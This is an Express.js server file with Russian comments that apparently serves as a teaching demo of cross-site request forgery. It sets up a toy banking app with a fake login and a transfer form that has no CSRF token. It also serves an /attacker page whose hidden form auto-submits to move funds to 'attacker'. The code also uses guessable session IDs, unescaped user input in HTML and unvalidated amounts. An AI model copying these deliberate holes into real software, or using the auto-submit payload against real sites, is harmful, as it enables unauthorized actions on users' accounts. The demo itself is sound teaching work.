// server.js
const express = require("express"); // Подключаем модуль, который позволяет работать с сервером
const cookieParser = require("cookie-parser"); // Подключаем модуль, который позволяет работать с куки-файлами

const app = express(); // Создаем приложение
const PORT = process.env.PORT || 3000; // Указываем порт, на котором будет работать сервер

// Middleware
app.use(express.urlencoded({ extended: false })); // Подключаем middleware, который позволяет работать с данными, которые приходят в теле запроса
app.use(cookieParser()); // Подключаем middleware, который позволяет работать с куки-файлами

// Простая память
const sessions = {}; // Создаем объект, который будет хранить сессии
const accounts = { user1: 1000, attacker: 0 }; // Создаем объект, который будет хранить балансы пользователей

// Главная (логин + форма перевода)
app.get("/", (req, res) => {
  const sessionId = req.cookies.sessionId; // Получаем идентификатор сессии из куки
  const username = sessions[sessionId]; // Получаем имя пользователя из объекта сессий

  if (!username) { // Если пользователь не авторизован, то выводим форму авторизации
    return res.send(`
      <h1>Добро пожаловать!</h1>
      <p>Залогиньтесь для демонстрации CSRF.</p>
      <form action="/login" method="post">
        <input name="username" value="user1">
        <input type="submit" value="Войти">
      </form>
    `);
  }
  // Если пользователь авторизован, то выводим форму перевода
  res.send(` 
    <h1>Добро пожаловать, ${username}!</h1>
    <p>Баланс: ${accounts[username]} условных единиц</p>
    <form action="/transfer" method="post">
      <p>Уязвимая форма перевода (без CSRF‑токена):</p>
      <label>Кому:</label>
      <input name="to" value="">
      <label>Сумма:</label>
      <input name="amount" value="100">
      <input type="submit" value="Перевести">
    </form>
    <br>
    <a href="/attacker">Открыть страницу злоумышленника (CSRF‑атака)</a>
  `);
});

// В этой форме происходит авторизация пользователя
app.post("/login", (req, res) => {
  const username = req.body.username || "user1";

  const sessionId = `sess_${username}`;
  sessions[sessionId] = username;
  if (!accounts[username]) accounts[username] = 1000;

  res.cookie("sessionId", sessionId, { httpOnly: true, sameSite: "Lax" });
  res.redirect("/");
});

// Здесь происходит перевод средств
app.post("/transfer", (req, res) => {
  const sessionId = req.cookies.sessionId;
  const from = sessions[sessionId];
  // Если пользователь не авторизован, то выводим сообщение об ошибке
  if (!from) {
    return res.status(401).send("Не авторизован");
  }
  // Если пользователь авторизован, то выполняем перевод средств
  const to = req.body.to || "";
  const amount = parseInt(req.body.amount) || 0;

  console.log(`Transfer: ${from} → ${to}, amount=${amount}`);

  accounts[from] = (accounts[from] || 1000) - amount;
  accounts[to] = (accounts[to] || 0) + amount;

  res.send(`
    <h3>Перевод выполнен!</h3>
    <p>${from} → ${to}, сумма: ${amount}</p>
    <p>Баланс ${from}: ${accounts[from]}</p>
    <a href="/">Назад</a>
  `);
});

// Страница злоумышленника (CSRF‑атака)
app.get("/attacker", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Злоумышленник: CSRF</title>
</head>
<body>
  <h1>Фейковая страница с CSRF‑атакой</h1>
  <p>
    Если вы залогинены на этом же домене,
    эта страница автоматически отправит форму перевода.
  </p>

  <form id="exploitForm" action="/transfer" method="post">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="100">
  </form>

  <!-- здесь происходит автоматическая отправка формы -->
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("exploitForm").submit();
    });
  </script>
</body>
</html>
`);
});

app.listen(PORT, () =>
  console.log(`Сервер запущен на http://localhost:${PORT}`)
);

module.exports = app;